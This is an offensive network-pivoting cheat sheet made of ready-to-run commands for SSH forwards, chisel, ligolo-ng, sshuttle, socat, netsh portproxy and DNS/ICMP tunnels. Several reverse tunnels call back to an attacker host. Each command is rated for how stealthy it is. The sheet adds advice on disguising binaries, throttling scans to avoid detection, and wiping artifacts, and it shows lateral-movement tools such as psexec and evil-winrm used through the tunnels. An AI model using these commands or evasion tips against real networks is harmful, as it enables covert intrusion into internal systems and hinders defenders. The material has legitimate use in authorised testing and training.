0) Quick chooser
Egress 22 open → SSH SOCKS/port-forward (Overlooked if long-lived).
Only 80/443 open → chisel (TLS) or ligolo-ng (TLS+TUN) (Overlooked).
Need full /24 routing → ligolo-ng or sshuttle (Overlooked; scanning becomes Obvious).
Only DNS/ICMP allowed → iodine/dnscat2 (DNS) or ptunnel-ng (ICMP) (Overlooked).
Windows-only box → plink / netsh portproxy / socat for Windows.
1) SSH tunnels (classic & reliable)
Dynamic SOCKS proxy (local):
ssh -D 1080 -N -f user@bastion              # Quiet (single long-lived session)
# Use: proxychains -q curl --socks5-hostname 127.0.0.1:1080 http://10.10.10.5
Local port-forward → service inside pivot net:
ssh -L 33890:10.10.10.5:3389 user@bastion -N -f   # RDP via localhost:33890
# Quiet (one stream). Scanning through it later = Obvious.
Reverse port-forward (target calls back to you):
ssh -R 4455:10.10.10.5:445 user@attacker -N       # LOUD (Overlooked) – “admin-ish”
Windows client (PuTTY/plink):
plink -ssh user@bastion -D 1080 -N -batch -C      # Quiet
Target indicators: 22 outbound allowed; bastion reachable.
OpSec: Add -o ServerAliveInterval=30, throttle scans; prefer single-service forwards.
2) chisel (HTTP(S) tunneling / reverse socks/ports)
Attacker (server with TLS):
chisel server --reverse --tls -p 8443             # LOUD (Overlooked) – looks like HTTPS
Target (client from inside):
# Create a SOCKS5 on attacker via reverse tunnel
chisel client https://ATTACKER:8443 R:socks5:0.0.0.0:1080         # Overlooked
# or map a port inside pivot net to attacker
chisel client https://ATTACKER:8443 R:3389:10.10.10.5:3389
Target indicators: 443 egress open; no TLS inspection/SSL pinning issues.
OpSec: Name binary benign, use --tls, keep low connection count.
Noise note: Scanning THROUGH the tunnel = Obvious.
3) ligolo-ng (modern, full-tunnel routing)
Attacker:
ligolo-ng relay -selfcert                                      # LOUD (Overlooked)
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
Target (agent on pivot):
agent -connect ATTACKER:11601 -ignore-cert
Back on attacker (console):
> session 1
> start
> route add 10.10.10.0/24
Now your box has a TUN interface to the pivoted subnet—use tools natively (no proxy).
Target indicators: Need to route whole subnets; 443/11601 egress open.
Noise: Route-wide scans (nmap/masscan) are Obvious.
4) sshuttle (transparent proxying of subnets)
sudo sshuttle -r user@bastion 10.10.10.0/24 -x bastion           # LOUD (Overlooked)
Target indicators: Quick win when you can SSH but don’t want to touch routes on target.
Noise: Any subsequent fast scan = Obvious.
5) socat / ncat (simple TCP/UDP relays)
Linux TCP relay (local listener → remote service):
socat TCP-LISTEN:33890,bind=127.0.0.1,fork,reuseaddr TCP:10.10.10.5:3389   # Quiet
Windows netcat-style relay:
ncat -l 33890 -c "ncat 10.10.10.5 3389"                                    # Quiet
UDP example:
socat UDP-LISTEN:69,fork,reuseaddr UDP:10.10.10.20:69                      # Quiet
Noise: Single service = Quiet; blasting scans through relays = Obvious.
6) netsh portproxy (Windows native pivot)
# Map local 0.0.0.0:8443 → 10.10.10.5:443
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 `
    connectaddress=10.10.10.5 connectport=443                              # Quiet
Target indicators: No extra tools; works across reboots.
OpSec: Clean up (netsh interface portproxy delete v4tov4 ...) after.
7) DNS / ICMP tunnels (last-ditch egress)
DNS:
# Attacker
iodine -f -P SecretPass tunnel.yourdomain.com                 # LOUD (Overlooked)
# Target
iodine -f -P SecretPass -r tunnel.yourdomain.com
ICMP:
# Attacker
ptunnel-ng -r 10.10.10.5:22 -lp 8000                          # LOUD (Overlooked)
# Target
ptunnel-ng -p ATTACKER -lp 2222
ssh -p 2222 localhost                                         # via ICMP
Target indicators: Only DNS/ICMP leaves network; heavy inspection absent.
Noise: Unusual query/ICMP patterns can trip DLP/NDR; keep throughput minimal.
8) Using the tunnel (tooling patterns)
SOCKS-aware (via proxychains):
# Configure: add "socks5 127.0.0.1 1080" to /etc/proxychains4.conf
proxychains -q curl http://10.10.10.5/
proxychains -q crackmapexec smb 10.10.10.0/24                 # LOUD (Obvious if wide scan)
proxychains -q impacket-psexec corp.local/user@10.10.10.5     #  Quiet (single op)
nmap through SOCKS:
proxychains -q nmap -sT -Pn -n -p 445,3389 10.10.10.0/24      # LOUD (Obvious). Use -sT only.
RDP/WinRM via forwarded port:
xfreerdp /v:127.0.0.1:33890 /u:corp\\user /p:pass             #  Quiet
evil-winrm -i 127.0.0.1 -P 59860 -u user -p pass              #  Quiet
9) Multi-hop chaining (one pivot to the next)
Stack tunnels: chisel (pivot1) → ligolo-ng (pivot2) → socat forward to internal host.
Route only what you need: add /32 routes for specific targets to reduce noise.
Throttle: nmap -T1 --max-rate 20 through tunnels; avoid masscan unless in labs.
10) OpSec & Defender view
What’s “Obvious”? bursty scans, many short TCP connects, SYNs to many ports, or SMB/WinRM sweeps.
What’s “Overlooked”? one long TLS/SSH connection carrying trickle traffic; HTTPS-looking chisel/ligolo.
Keep it tame: prefer single-service forwards; scan hosts individually; close tunnels when done; clean artifacts (binaries, services, portproxy entries, firewall rules).
Quick cleanup snippets
# chisel: kill process; remove binary/logs
pkill -f chisel
# ligolo-ng: > stop ; ip link del ligolo
sudo ip link del ligolo
# ssh: pkill -f "ssh -D|ssh -L|ssh -R"
# Windows portproxy cleanup
netsh interface portproxy show v4tov4
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=8443
